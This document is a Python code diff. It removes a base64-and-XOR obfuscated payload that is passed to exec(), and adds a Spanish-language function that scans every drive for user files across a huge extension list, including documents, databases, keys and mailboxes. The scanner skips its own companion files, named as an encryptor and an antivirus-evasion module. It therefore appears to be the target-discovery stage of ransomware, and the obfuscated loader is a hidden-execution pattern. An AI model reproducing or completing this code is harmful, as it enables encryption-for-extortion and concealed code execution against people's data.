@@ -1,9 +1,141 @@
-import base64
-def _x(d,k):
-    r=[]
-    for i,c in enumerate(d):
-        r.append(chr(ord(c)^ord(k[i%len(k)])))
-    return ''.join(r)
-_k="a0edec30e0704e4a"
-_c=base64.b64decode("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").decode()
-exec(_x(_c,_k))
+import os
+import platform
+import ctypes
+from collections import defaultdict
+
+
+def es_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+
+def escanear_sistema():
+    sistema = platform.system()
+    admin = es_admin()
+    extensiones = {
+        '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
+        '.odt', '.ods', '.odp', '.rtf', '.tex', '.wpd', '.wps', '.pages',
+        '.numbers', '.key', '.odg', '.odf', '.ott', '.ots', '.otp', '.oth',
+        '.odm', '.sxw', '.stw', '.sxc', '.stc', '.sxi', '.sti', '.sxd', '.std',
+        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico', '.tif',
+        '.tiff', '.webp', '.psd', '.ai', '.eps', '.raw', '.cr2', '.nef',
+        '.orf', '.sr2', '.heic', '.indd', '.cdr', '.sketch', '.xcf', '.kra',
+        '.ora', '.exr', '.dds', '.tga', '.pcx', '.pict', '.pct', '.sgi', '.rgb',
+        '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v',
+        '.mpg', '.mpeg', '.3gp', '.f4v', '.swf', '.vob', '.ogv', '.m2ts',
+        '.mts', '.ts', '.divx', '.xvid', '.rm', '.rmvb', '.asf', '.m2v',
+        '.svi', '.3g2', '.mxf', '.roq', '.nsv', '.yuv',
+        '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus',
+        '.ape', '.alac', '.aiff', '.mid', '.midi', '.amr', '.ac3', '.dts',
+        '.mka', '.mp2', '.mpa', '.ra', '.tta', '.voc', '.vox', '.wv',
+        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.cab',
+        '.iso', '.dmg', '.pkg', '.deb', '.rpm', '.tgz', '.tbz2', '.lz',
+        '.lzma', '.z', '.arj', '.ace', '.zipx', '.lha', '.lzh', '.zoo',
+        '.arc', '.pak', '.sit', '.sitx', '.sea', '.shar', '.uue', '.uu',
+        '.sql', '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.dbf',
+        '.pdb', '.frm', '.myd', '.myi', '.ibd', '.sqlitedb', '.db3',
+        '.fdb', '.gdb', '.nsf', '.wdb', '.dat', '.fp7', '.fmp12',
+        '.csv', '.json', '.xml', '.html', '.css', '.js', '.php', '.py',
+        '.java', '.c', '.cpp', '.h', '.hpp', '.cs', '.go', '.rb', '.pl',
+        '.swift', '.kt', '.rs', '.lua', '.r', '.m', '.vb', '.asp', '.aspx',
+        '.jsp', '.scala', '.groovy', '.dart', '.ts', '.tsx', '.jsx',
+        '.vue', '.sass', '.scss', '.less', '.coffee', '.ejs', '.pug',
+        '.haml', '.slim', '.erb', '.hbs', '.mustache', '.twig', '.blade',
+        '.sol', '.asm', '.s', '.pas', '.pp', '.inc', '.ino', '.pde',
+        '.exe', '.msi', '.dll', '.sys', '.bat', '.ps1', '.sh', '.cmd',
+        '.app', '.deb', '.rpm', '.apk', '.ipa', '.dmg', '.pkg', '.run',
+        '.bin', '.out', '.elf', '.com', '.scr', '.vbs', '.wsf', '.gadget',
+        '.jar', '.war', '.ear', '.class', '.pyc', '.pyo', '.pyd', '.so',
+        '.dylib', '.o', '.a', '.lib', '.ocx', '.cpl', '.drv', '.efi',
+        '.ini', '.cfg', '.conf', '.config', '.yaml', '.yml', '.toml',
+        '.properties', '.env', '.editorconfig', '.htaccess', '.gitignore',
+        '.dockerignore', '.npmignore', '.eslintrc', '.prettierrc', '.babelrc',
+        '.log', '.bak', '.tmp', '.temp', '.cache', '.old', '.orig',
+        '.swp', '.swo', '.DS_Store', '.localized', '.thumbs', '.lnk',
+        '.vhd', '.vhdx', '.vmdk', '.vdi', '.qcow2', '.img', '.ova', '.ovf',
+        '.vmx', '.vmem', '.vmsn', '.vmsd', '.nvram', '.vbox', '.hdd',
+        '.cer','.crt', '.pem', '.key', '.pfx', '.p12', '.p7b', '.der',
+        '.jks', '.keystore', '.pgp', '.gpg', '.asc', '.p7c', '.spc', '.p7r',
+        '.eml', '.msg', '.pst', '.ost', '.mbox', '.emlx', '.mbx', '.dbx',
+        '.epub', '.mobi', '.azw', '.azw3', '.fb2', '.lit', '.lrf', '.cbr',
+        '.cbz', '.cb7', '.cbt', '.cba', '.djvu', '.djv', '.ibook',
+        '.dwg', '.dxf', '.skp', '.blend', '.max', '.3ds', '.obj', '.fbx',
+        '.stl', '.step', '.stp', '.iges', '.igs', '.sat', '.sldprt', '.sldasm',
+        '.slddrw', '.ipt', '.iam', '.idw', '.prt', '.asm', '.drw', '.catpart',
+        '.catproduct', '.cgr', '.3dm', '.rvt', '.rfa', '.rte', '.rft', ''
+    }
+    if admin:
+        evitar_parcial = set()
+    else:
+        evitar_parcial = {
+            'Windows\\System32', 'Windows\\SysWOW64', 'Windows\\WinSxS',
+            'Program Files\\Windows', 'Program Files (x86)\\Windows',
+            '$Recycle.Bin', 'python_portable', 'AppData\\Local\\Temp',
+            'AppData\\Local\\Microsoft\\Windows\\INetCache',
+            'AppData\\Local\\Microsoft\\Windows\\WebCache'
+        }
+    archivos_app = {'launcher.py', 'rutas.py', 'encriptador_12_capas.py', 'evasion_av.py', 'launcher.bat', 'launcher.sh'}
+    dir_app = os.path.abspath(os.getcwd())
+    archivos_encontrados = []
+    contador_ext = defaultdict(int)
+    total = 0
+    if sistema == "Windows":
+        if admin:
+            rutas_escanear = ['C:\\']
+            for letra in 'DEFGHIJKLMNOPQRSTUVWXYZ':
+                unidad = f'{letra}:\\'
+                if os.path.exists(unidad):
+                    rutas_escanear.append(unidad)
+        else:
+            rutas_escanear = [
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Desktop'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Documents'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Downloads'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Pictures'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Videos'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Music'),
+                'C:\\Users', 'D:\\', 'E:\\', 'F:\\'
+            ]
+    else:
+        rutas_escanear = ['/home', '/']
+    for ruta_base in rutas_escanear:
+        if not os.path.exists(ruta_base):
+            continue
+        try:
+            for root, dirs, files in os.walk(ruta_base):
+                if not admin:
+                    debe_excluir = False
+                    for carpeta_exc in evitar_parcial:
+                        if carpeta_exc in root:
+                            debe_excluir = True
+                            dirs[:] = []
+                            break
+                    if debe_excluir:
+                        continue
+                root_abs = os.path.abspath(root)
+                if root_abs == dir_app:
+                    dirs[:] = []
+                    continue
+                for archivo in files:
+                    try:
+                        total += 1
+                        if archivo.lower() in [x.lower() for x in archivos_app]:
+                            continue
+                        ext = os.path.splitext(archivo)[1].lower()
+                        ruta_completa = os.path.join(root, archivo)
+                        incluir = False
+                        if ext in extensiones:
+                            incluir = True
+                        elif ext == '':
+                            incluir = True
+                            ext = '[sin_ext]'
+                        if incluir:
+                            archivos_encontrados.append(ruta_completa)
+                            contador_ext[ext] += 1
+                    except:
+                        continue
+        except:
+            continue
+    return archivos_encontrados, contador_ext, total
